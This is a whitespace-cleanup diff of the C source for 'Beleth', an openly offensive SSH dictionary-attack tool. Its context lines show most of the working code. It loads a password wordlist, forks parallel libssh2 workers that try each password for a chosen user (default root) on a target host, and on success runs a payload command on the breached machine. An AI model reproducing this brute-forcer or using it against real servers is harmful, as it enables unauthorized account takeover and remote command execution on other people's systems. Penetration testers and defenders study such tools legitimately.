@@ -1,7 +1,7 @@
 /*
  * Beleth - SSH Dictionary Attack
  * beleth.c -- Main functions
- */ 
+ */
 
 #include <libssh2.h>
 #include <sys/socket.h>
@@ -21,28 +21,28 @@ char username[50] = "root";
 char cmdline[256] = "uname -a && id";
 unsigned int sleep_timeout = 400; /* used for usleep on reconnects */
 
-/* 
+/*
  * Add each line of the wordlist to the linked list
  */
 int read_wordlist(char *path) {
 	FILE *wordlist;
 	char line[256];
 	int cnt = 0;
-	
+
 	wordlist = fopen(path,"r");
 	if (wordlist == NULL) {
 		fprintf(stderr,"[!] Unable to open file %s\n",path);
 		return -1;
 	}
-	
+
 	while (fgets(line,sizeof(line)-1, wordlist) != NULL) {
 			++cnt;
 			line[strlen(line)-1] = '\0'; /* Trim of new line */
 			add_pw_list(line);
 	}
-	
+
 	fprintf(stdout, "[*] Read %d passwords from file.\n",cnt);
-		
+
 	fclose(wordlist);
 	return 1;
 }
@@ -57,30 +57,30 @@ void print_help(char *cmd) {
 	fprintf(stderr,"\t-t [target]\tAttempt connections to this server\n");
 	fprintf(stderr,"\t-u [user]\tAttempt connection using this username\n");
 	fprintf(stderr,"\t-v\t\t-v (Show attempts) -vv (Show debugging)\n");
-	fprintf(stderr,"\t-w [wordlist]\tUse this wordlist. Defaults to wordlist.txt\n");	
+	fprintf(stderr,"\t-w [wordlist]\tUse this wordlist. Defaults to wordlist.txt\n");
 }
 
-/* 
- * crack_thread 
- * Called as the child process of fork. 
+/*
+ * crack_thread
+ * Called as the child process of fork.
  */
 void crack_thread(struct t_ctx *c_thread) {
 	char buf[256];
 	int rc;
-	
-	if (verbose >= VERBOSE_DEBUG) 
+
+	if (verbose >= VERBOSE_DEBUG)
 		fprintf(stderr, "[*] (%d) Connecting to: %s:%d\n",getpid(),c_thread->host,c_thread->port);
-    
-    
+
+
     while ((c_thread->sock = session_init(c_thread->host,c_thread->port,c_thread->session)) == -1) {
-		if (verbose >= VERBOSE_DEBUG) 
+		if (verbose >= VERBOSE_DEBUG)
 			fprintf(stderr,"[!] Unable to connect to %s:%d\n",c_thread->host,c_thread->port);
 		session_cleanup(c_thread->sock, c_thread->session);
 		c_thread->session = libssh2_session_init();
-		
+
 		usleep(sleep_timeout);
 	}
-	
+
 	while (1) {
 		memset(buf,0x00,sizeof(buf));
 		snprintf(buf, sizeof(buf)-1,"%c",REQ_PW);
@@ -94,18 +94,18 @@ void crack_thread(struct t_ctx *c_thread) {
 		if (buf[0] == NO_PW) { /* Cleanup if there's no more work */
 			session_cleanup(c_thread->sock, c_thread->session);
 			exit(0);
-		} 
-		
+		}
+
 		if (verbose >= VERBOSE_ATTEMPTS)
 			fprintf(stderr,"[+] (%d) Trying %s %s\n",getpid(),username,buf);
 		if ((rc=libssh2_userauth_password(c_thread->session, username, buf))) {
 			if (rc != LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
 					session_cleanup(c_thread->sock, c_thread->session);
 					c_thread->session = libssh2_session_init();
-					
+	
 					while ( (c_thread->sock = session_init(c_thread->host,c_thread->port, c_thread->session)) == -1) {
-						if (verbose >= VERBOSE_DEBUG) 
-							fprintf(stderr, "[!] Unable to reconnect to %s:%d\n",c_thread->host,c_thread->port);	
+						if (verbose >= VERBOSE_DEBUG)
+							fprintf(stderr, "[!] Unable to reconnect to %s:%d\n",c_thread->host,c_thread->port);
 						session_cleanup(c_thread->sock,c_thread->session);
 						c_thread->session = libssh2_session_init();
 						usleep(sleep_timeout);
@@ -117,7 +117,7 @@ void crack_thread(struct t_ctx *c_thread) {
 			if (drop_payload(c_thread->sock,c_thread->session,(char *)cmdline) == -1) {
 				if (verbose >= VERBOSE_DEBUG)
 					fprintf(stderr, "Error executing command.\n");
-			}   
+			}
 			buf[0] = FND_PW;
 			buf[1] = '\0';
 			write(c_thread->fd,buf,strlen(buf));
@@ -129,40 +129,40 @@ void crack_thread(struct t_ctx *c_thread) {
 
 /*
  * listen_sock
- * Handle listening and accepting unix socket domains 
+ * Handle listening and accepting unix socket domains
  * Returns -1 on error. file descriptor to listening socket on success
  */
 int listen_sock(int backlog) {
 	struct sockaddr_un addr;
 	int fd,optval=1;
-	
+
 	if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
 		if (verbose >= VERBOSE_DEBUG)
 			fprintf(stderr, "[!] Error setting up UNIX socket\n");
 		return -1;
 	}
-	
+
 	fcntl(fd, F_SETFL, O_NONBLOCK); /* Set socket to non blocking */
 	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int));
-	
+
 	memset(&addr,0x00,sizeof(addr));
 	addr.sun_family = AF_UNIX;
 	strncpy(addr.sun_path, sock_file, sizeof(addr.sun_path)-1);
-	
+
 	unlink(sock_file);
-	
+
 	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
 		if (verbose >= VERBOSE_DEBUG)
 			fprintf(stderr, "[!] Error binding to UNIX socket\n");
 		return -1;
 	}
-	
+
 	if (listen(fd, backlog) == -1) {
 		if (verbose >= VERBOSE_DEBUG)
 			fprintf(stderr, "[!] Error listening to UNIX socket\n");
 		return -1;
 	}
-	
+
 	return fd;
 }
 
@@ -174,17 +174,17 @@ int listen_sock(int backlog) {
 int connect_sock(void) {
 	int fd;
 	struct sockaddr_un addr;
-	
+
 	if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
 		if (verbose >= VERBOSE_DEBUG)
 			fprintf(stderr, "[!] Error creating UNIX socket\n");
 		return -1;
 	}
-	
+
     memset(&addr,0x00,sizeof(addr));
     addr.sun_family = AF_UNIX;
     strncpy(addr.sun_path, sock_file, sizeof(addr.sun_path)-1);
-    
+
     if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
 		if (verbose >= VERBOSE_DEBUG)
 			fprintf(stderr, "[!] Error connecting to UNIX socket\n");
@@ -203,10 +203,10 @@ void init_pw_tasker(int unix_fd, int threads) {
 	int fdmax = unix_fd, i, rc, newfd;
 	int child_count=0, auth=0;
 	fd_set readfds,master;
-		
+
 	FD_ZERO(&master);
 	FD_SET(unix_fd,&master);
-		
+
 	while(1) {
 		readfds = master;
 		i = select(fdmax+1,&readfds,NULL,NULL,NULL);
@@ -238,10 +238,10 @@ void init_pw_tasker(int unix_fd, int threads) {
 									close(unix_fd);
 									unlink(sock_file);
 									destroy_pw_list();
-									if (auth == 0) 
+									if (auth == 0)
 										printf("[!] No password matches found.\n");
 									exit(0);
-								}									
+								}					
 							} else {
 								write(rc, current_pw->pw, strlen(current_pw->pw));
 								current_pw = current_pw->next;
@@ -263,11 +263,11 @@ void init_pw_tasker(int unix_fd, int threads) {
 
 int main(int argc, char *argv[]) {
     int rc, remote_port = 22, c_opt;
-    int threads = 10, unix_fd, i; 
-  
+    int threads = 10, unix_fd, i;
+
     char host[21] = "127.0.0.1", str_wordlist[256] = "wordlist.txt";
 	pid_t pid, task_pid;
-	
+
 	verbose = 0;
 	rc = libssh2_init (0);
 
@@ -275,7 +275,7 @@ int main(int argc, char *argv[]) {
 		fprintf (stderr, "[!] libssh2 initialization failed (%d)\n", rc);
 		return 1;
 	}
- 
+
     if (argc > 1) {
 		while ((c_opt = getopt(argc, argv, "hvp:t:u:w:c:l:")) != -1) {
 			switch(c_opt) {
@@ -321,39 +321,39 @@ int main(int argc, char *argv[]) {
 		print_help(argv[0]);
 		exit(1);
 	}
-	
+
 	/* Print banner */
 	printf("\e[32m\e[40m+-----------------------------------------+\e[0m\n\e[40m\e[32m|                 Beleth                  |\e[0m\n");
 	printf("\e[40m\e[32m|           www.chokepoint.net            |\e[0m\n\e[40m\e[32m+-----------------------------------------+\e[0m\n");
-	
+
 	/* Initiate the linked list using the given wordlist */
     if (read_wordlist(str_wordlist) == -1)
 		return 1;
-	
-	printf("[*] Starting task manager\n");	
+
+	printf("[*] Starting task manager\n");
 	/* Listen to UNIX socket for IPC */
 	if ((unix_fd = listen_sock(threads)) == -1) {
 		destroy_pw_list();
 		exit(1);
 	}
-	
+
 	pid = fork();
 	if (pid < 0) {
 		fprintf(stderr, "[!] Couldn't fork!\n");
 		destroy_pw_list();
 		exit(1);
 	} else if (pid == 0) { /* Child thread */
-		init_pw_tasker(unix_fd, threads	);	
+		init_pw_tasker(unix_fd, threads	);
 	} else {
 		task_pid = pid;
 	}
-	
+
 	printf("[*] Spawning %d threads\n",threads);
 	printf("[*] Starting attack on %s@%s:%d\n",username,host,remote_port);
 	/* Loop through and spawn correct number of child threads */
 	for (i = 0; i < threads; ++i) {
 		struct t_ctx *ptr = (struct t_ctx*)malloc(sizeof(struct t_ctx));
-	
+
 		init_thread_ctx(host, remote_port, ptr);
 		pid = fork();
 		if (pid < 0) {
@@ -362,7 +362,7 @@ int main(int argc, char *argv[]) {
 			exit(1);
 		} else if (pid == 0)  { 				/* child thread */
 			crack_thread(t_current);
-			
+
 			if (ptr != NULL)
 				free(ptr);
 		} else {
@@ -370,11 +370,11 @@ int main(int argc, char *argv[]) {
 				free(ptr);
 		}
 	}
- 
+
 	int status; /* Wait for the tasker to clean up */
 	waitpid(task_pid, &status, 0);
- 
- 	/* proper cleanup */
+
+	/* proper cleanup */
 	destroy_pw_list();
 	libssh2_exit();
     return 0;
